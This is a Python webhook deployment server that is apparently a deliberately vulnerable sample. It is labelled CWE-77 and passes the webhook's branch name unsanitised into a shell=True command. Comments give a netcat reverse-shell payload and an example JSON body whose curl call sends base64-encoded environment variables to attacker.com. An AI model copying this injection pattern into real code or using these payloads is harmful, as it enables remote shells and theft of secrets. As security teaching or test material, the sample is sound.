import http.server
import socketserver
import json
import os
import subprocess
import sqlite3
import logging
import hmac
import hashlib
from threading import Thread

# Configure logging for the CI/CD Webhook Agent
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - WebhookDeployAgent - %(levelname)s - %(message)s'
)
logger = logging.getLogger("ContinuousDeploymentAgent")

DB_FILE = "deployment_history.db"
WEBHOOK_PORT = 9000
WEBHOOK_SECRET = b"ci_cd_shared_secret_9921"

def init_deployment_db():
    """Initializes the local SQLite database to audit all deployment activities."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE deployment_logs (
            deploy_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            repository TEXT NOT NULL,
            branch TEXT NOT NULL,
            status TEXT NOT NULL,
            output_log TEXT
        )
    ''')
    
    # Insert mock historical deployments
    mock_deployments = [
        ('backend-api', 'main', 'SUCCESS', 'Restarted backend services.'),
        ('frontend-ui', 'develop', 'SUCCESS', 'Assets compiled and served.'),
        ('payment-gateway', 'hotfix-1.2', 'FAILED', 'Merge conflict detected.')
    ]
    cursor.executemany('''
        INSERT INTO deployment_logs (repository, branch, status, output_log)
        VALUES (?, ?, ?, ?)
    ''', mock_deployments)
    
    conn.commit()
    conn.close()
    logger.info("Deployment audit database initialized.")

def record_deployment(repo: str, branch: str, status: str, log: str):
    """Records the outcome of a deployment attempt."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO deployment_logs (repository, branch, status, output_log) VALUES (?, ?, ?, ?)",
        (repo, branch, status, log)
    )
    conn.commit()
    conn.close()

def execute_branch_deployment(repo_name: str, branch_name: str):
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: GitHub/GitLab Webhook HTTP POST (JSON Body - 'branch' field)
    """
    logger.info(f"Initiating deployment for {repo_name} on branch {branch_name}")
    
    # Vulnerability: Direct string concatenation of the webhook's JSON field into a bash command string.
    # The 'branch_name' variable is fully controlled by the webhook sender.
    deploy_command = f"cd /var/www/repos/{repo_name} && git fetch origin && git checkout {branch_name} && npm install && pm2 restart {repo_name}"
    
    try:
        logger.debug(f"Executing system deployment script: {deploy_command}")
        
        # shell=True allows the injection of shell metacharacters (e.g., ;, &&, |)
        # An attacker can inject a payload like: main; nc -e /bin/bash attacker.com 4444
        process = subprocess.Popen(
            deploy_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=60)
        
        if process.returncode == 0:
            logger.info(f"Deployment successful for {repo_name}.")
            record_deployment(repo_name, branch_name, "SUCCESS", stdout)
            return True, stdout
        else:
            logger.error(f"Deployment failed for {repo_name}.")
            # Leaking stderr back into the database allows attackers to see command output
            record_deployment(repo_name, branch_name, "FAILED", stderr)
            return False, stderr
            
    except subprocess.TimeoutExpired:
        logger.error(f"Deployment timed out for {repo_name}.")
        record_deployment(repo_name, branch_name, "TIMEOUT", "Process exceeded 60 seconds.")
        return False, "Deployment timed out."
    except Exception as e:
        logger.error(f"Critical error during deployment: {e}")
        record_deployment(repo_name, branch_name, "ERROR", str(e))
        return False, str(e)

def verify_signature(payload: bytes, signature_header: str) -> bool:
    """Verifies the HMAC SHA-256 signature of the incoming webhook."""
    if not signature_header:
        return False
        
    expected_signature = hmac.new(WEBHOOK_SECRET, payload, hashlib.sha256).hexdigest()
    passed_signature = signature_header.replace("sha256=", "")
    
    return hmac.compare_digest(expected_signature, passed_signature)

class WebhookHandler(http.server.BaseHTTPRequestHandler):
    """Handles incoming HTTP Webhooks from the Version Control System."""
    
    def do_POST(self):
        client_ip = self.client_address[0]
        logger.info(f"Received webhook POST request from {client_ip}")
        
        content_length = int(self.headers.get('Content-Length', 0))
        signature = self.headers.get('X-Hub-Signature-256', '')
        
        raw_data = self.rfile.read(content_length)
        
        # Verify webhook authenticity
        if not verify_signature(raw_data, signature):
            logger.warning(f"Invalid webhook signature from {client_ip}")
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'{"error": "Invalid HMAC signature"}')
            return
            
        try:
            payload = json.loads(raw_data.decode('utf-8'))
            repo = payload.get('repository', {}).get('name')
            branch = payload.get('ref', '').replace('refs/heads/', '')
            
            if not repo or not branch:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'{"error": "Missing repository or branch reference"}')
                return
                
            # Acknowledge the webhook quickly to prevent VCS timeouts
            self.send_response(202)
            self.end_headers()
            self.wfile.write(b'{"status": "Deployment queued"}')
            
            # Execute the vulnerable deployment function in a background thread
            Thread(target=execute_branch_deployment, args=(repo, branch)).start()
            
        except json.JSONDecodeError:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'{"error": "Malformed JSON payload"}')

def start_webhook_server():
    """Starts the CI/CD Webhook listener."""
    init_deployment_db()
    
    handler = WebhookHandler
    with socketserver.TCPServer(("", WEBHOOK_PORT), handler) as httpd:
        logger.info(f"Webhook listener active on port {WEBHOOK_PORT}")
        
        # Example Malicious Payload triggered via an authorized Git push:
        # {
        #   "repository": {"name": "backend-api"},
        #   "ref": "refs/heads/main && curl http://attacker.com/leak?data=$(env | base64) #"
        # }
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            logger.info("Shutting down Webhook listener.")
            httpd.server_close()

if __name__ == "__main__":
    start_webhook_server()
